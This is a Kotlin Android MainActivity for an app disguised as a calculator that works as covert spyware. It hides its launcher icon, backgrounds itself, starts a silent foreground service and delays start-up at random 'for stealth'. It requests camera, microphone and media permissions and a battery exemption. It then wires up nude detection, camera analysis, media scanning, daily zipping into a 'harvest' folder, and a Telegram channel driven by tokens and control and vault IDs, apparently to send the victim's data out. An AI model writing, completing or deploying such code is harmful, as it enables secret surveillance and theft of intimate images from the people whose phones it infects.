package com.example.app

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
    }

    private lateinit var tvDisplay: TextView
    private lateinit var etLog: EditText

    private var telegramUi: TelegramUi? = null
    private var mediaScanner: MediaScanner? = null
    private var runtimeDir: File? = null

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            logToFile("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            lifecycleScope.launch(Dispatchers.IO) {
                delay(Random.nextLong(3000, 8000))
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            startSilentForegroundService()
            logToFile("✅ Foreground service started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
        }

        disableLauncherIcon()

        setContentView(R.layout.activity_dummy_calculator)

        tvDisplay = findViewById(R.id.tvDisplay)
        etLog = findViewById(R.id.etLog)

        setupDummyCalculator()

        lifecycleScope.launch(Dispatchers.IO) {
            val delayMs = Random.nextLong(5000, 10000)
            logToFile("⏳ Delaying initialization by ${delayMs / 1000}s for stealth...")
            delay(delayMs)
            initCoreAsync()
        }

        lifecycleScope.launch(Dispatchers.Main) {
            delay(3000)
            moveTaskToBack(true)
        }

        logToFile("🚀 Shield Core v4.2 initialized in stealth mode")
    }

    private fun setupDummyCalculator() {
        val buttonIds = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv,
            R.id.btnEquals, R.id.btnClear, R.id.btnDot
        )

        buttonIds.forEach { id ->
            findViewById<Button>(id)?.setOnClickListener { view ->
                val btn = view as Button
                val currentText = tvDisplay.text.toString()

                logToFile("🔘 Key pressed: ${btn.text}")

                when (btn.id) {
                    R.id.btnClear -> tvDisplay.text = "0"
                    R.id.btnEquals -> {
                        try {
                            val result = evaluateExpression(currentText)
                            tvDisplay.text = result.toString()
                            Toast.makeText(this, "Result: $result", Toast.LENGTH_SHORT).show()
                        } catch (e: Exception) {
                            tvDisplay.text = "Error"
                            Toast.makeText(this, "Invalid expression", Toast.LENGTH_SHORT).show()
                        }
                    }
                    else -> {
                        val newText = if (currentText == "0" && btn.text.toString() !in listOf(".", "+", "-", "×", "÷")) {
                            btn.text.toString()
                        } else {
                            currentText + btn.text
                        }
                        tvDisplay.text = newText
                    }
                }
            }
        }

        findViewById<Button>(R.id.btnCopyLog)?.setOnClickListener {
            val logText = etLog.text.toString()
            if (logText.isNotBlank()) {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("ShieldCore_Logs", logText)
                clipboard.setPrimaryClip(clip)
                Toast.makeText(this, "✅ Logs copied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun evaluateExpression(expression: String): Double {
        val sanitized = expression
            .replace("×", "*")
            .replace("÷", "/")
            .replace(" ", "")

        return when {
            sanitized.contains("+") -> {
                val parts = sanitized.split("+")
                parts.sumOf { it.toDouble() }
            }
            sanitized.contains("-") -> {
                val parts = sanitized.split("-")
                var result = parts[0].toDouble()
                for (i in 1 until parts.size) {
                    result -= parts[i].toDouble()
                }
                result
            }
            sanitized.contains("*") -> {
                val parts = sanitized.split("*")
                parts.fold(1.0) { acc, s -> acc * s.toDouble() }
            }
            sanitized.contains("/") -> {
                val parts = sanitized.split("/")
                var result = parts[0].toDouble()
                for (i in 1 until parts.size) {
                    result /= parts[i].toDouble()
                }
                result
            }
            else -> sanitized.toDouble()
        }
    }

    private fun disableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            logToFile("✅ App icon hidden from launcher")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to hide app icon: ${e.message}")
        }
    }

    @Suppress("unused")
    private fun enableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            logToFile("✅ App icon shown")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to show app icon: ${e.message}")
        }
    }

    private fun startSilentForegroundService() {
        try {
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            logToFile("✅ Foreground service started")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to start service: ${e.localizedMessage}")
        }
    }

    // ✅ تم تحسين initCoreAsync مع تسجيل مفصل ومعالجة الأخطاء
    private suspend fun initCoreAsync() {
        delay(Random.nextLong(2000, 7000))
        logToFile("🚀 Starting core initialization...")

        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }

        delay(Random.nextLong(1000, 3000))

        try {
            setupDirectories()
            logToFile("✅ Directories ready")

            requestBatteryOptimizationExemption()

            val config = ConfigLoader.load(this@MainActivity)
            logToFile("✅ Config loaded: ${config.activeTokens.size} active tokens")
            logToFile("   Control ID: ${config.controlId}, Vault ID: ${config.vaultId}")
            logToFile("   Secret length: ${config.secret.length}")

            if (config.activeTokens.isEmpty()) {
                logToFile("⚠️ WARNING: No active tokens! Telegram UI will not work.")
            }

            val monitor = Monitor.getInstance(this@MainActivity)
            logToFile("✅ Monitor instance ready")

            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
            logToFile("✅ NudeDetector created (ready: ${nudeDetector.isReady()})")

            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
            logToFile("✅ CameraAnalyzer created")

            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                config = config
            )
            val ui = telegramUi!!
            logToFile("✅ TelegramUi created with ${config.activeTokens.size} tokens")

            mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
            logToFile("✅ MediaScanner created")

            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
            logToFile("✅ DailyZipper created")

            monitor.ui = ui
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId
            monitor.cameraAnalyzer = cameraAnalyzer
            monitor.mediaScanner = mediaScanner
            monitor.dailyZipper = dailyZipper
            monitor.nudeDetector = nudeDetector
            logToFile("✅ All components linked to Monitor")

            val uiStarted = ui.start()
            logToFile("✅ TelegramUi start: $uiStarted")
            
            monitor.start()
            logToFile("✅ Monitor started")

            logToFile("🎉 All systems operational in stealth mode")

        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            logToFile("💥 [ERROR] ${e.message}")
            e.printStackTrace()
        }
    }

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir!!.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir!!.deleteRecursively()
                logToFile("🧹 Cleaned old runtime files (v$oldVersion)")
            }
        }

        runtimeDir!!.mkdirs()
        versionFile.writeText(APP_VERSION)

        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        File(runtimeDir, "models").mkdirs()
        File(runtimeDir, "harvest").mkdirs()
    }

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            logToFile("⚠️ Requesting ${missing.size} permissions...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            logToFile("✅ All permissions granted")
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    logToFile("⚠️ Failed to request battery exemption: ${e.localizedMessage}")
                }
            }
        }
    }

    private fun logToFile(message: String) {
        Log.i(TAG, message)
        runOnUiThread {
            try {
                val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
                val logEntry = "[$timestamp] $message\n"
                etLog.append(logEntry)
                val lines = etLog.text.split("\n")
                if (lines.size > 200) {
                    val keep = lines.takeLast(200)
                    etLog.setText(keep.joinToString("\n"))
                }
            } catch (_: Exception) {
                // تجاهل أخطاء واجهة المستخدم
            }
        }
    }

    private fun clearAppData() {
        try {
            telegramUi?.stop()
            telegramUi = null
            logToFile("🛑 TelegramUi stopped")

            try {
                Monitor.getInstance(this).stop()
                logToFile("🛑 Monitor stopped")
            } catch (e: Exception) {
                logToFile("⚠️ Failed to stop Monitor: ${e.message}")
            }

            try {
                mediaScanner?.close()
                mediaScanner = null
                logToFile("🧹 MediaScanner closed")
            } catch (e: Exception) {
                logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
            }

            ConfigLoader.clearSensitiveData()
            SecurityHelper.clearCachedKey()
            SecurityHelper.clearMasterKey()

            val runtimeDir = File(filesDir, ".sys_runtime")
            if (runtimeDir.exists()) {
                runtimeDir.deleteRecursively()
                logToFile("🧹 All app data cleared")
            } else {
                logToFile("ℹ️ No data to clear")
            }

            setupDirectories()
            logToFile("🔄 Directories recreated")

        } catch (e: Exception) {
            logToFile("❌ Failed to clear data: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()

        telegramUi?.stop()
        telegramUi = null
        logToFile("🛑 TelegramUi stopped")

        try {
            mediaScanner?.close()
            mediaScanner = null
            logToFile("🧹 MediaScanner closed")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
        }

        try {
            Monitor.getInstance(this).stop()
            logToFile("🛑 Monitor stopped")
        } catch (e: Exception) {
            logToFile("⚠️ Failed to stop Monitor: ${e.message}")
        }

        SecurityHelper.cleanup()
        logToFile("🧹 SecurityHelper cleaned up")
        logToFile("✅ Application shutdown complete")
    }
}
